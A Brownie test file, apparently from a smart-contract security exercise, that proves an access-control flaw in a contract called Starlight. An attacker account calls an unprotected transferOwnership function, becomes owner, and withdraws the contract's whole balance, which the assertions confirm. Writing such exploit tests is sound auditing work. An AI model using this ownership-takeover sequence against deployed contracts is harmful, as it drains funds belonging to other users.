from brownie import accounts, Starlight
# Setting accounts

def test_access_control_4():
    # Deploying accts
    [dep, user, attacker] = accounts[:3]

    # deploying contract
    ac4 = Starlight.deploy({'from': dep})

    # Funding contract through buyToken and simulating regular user interaction
    amount = 100000
    value = amount //100

    ac4.buyTokens(amount, user.address, {'from': user, 'value': value})

    #assert token balance to user account
    assert(ac4.balanceOf(user.address) == 100000)

    # Assigning initial balance variables forlater assertion testing
    intialBal = attacker.balance()
    contractInitialBal = ac4.balance()

    # Calling unprotected transferOwnership function from attacker account
    ac4.transferOwnership(attacker.address, {'from': attacker})

    #Assert new ownership for attacker
    assert(ac4.owner() == attacker.address)

    # Attacker calls withdraw and drain contract funds
    ac4.withdraw({'from':attacker})

    #Assert new funds for attacker
    assert(attacker.balance() == intialBal + contractInitialBal)
    assert(ac4.balance() == 0)
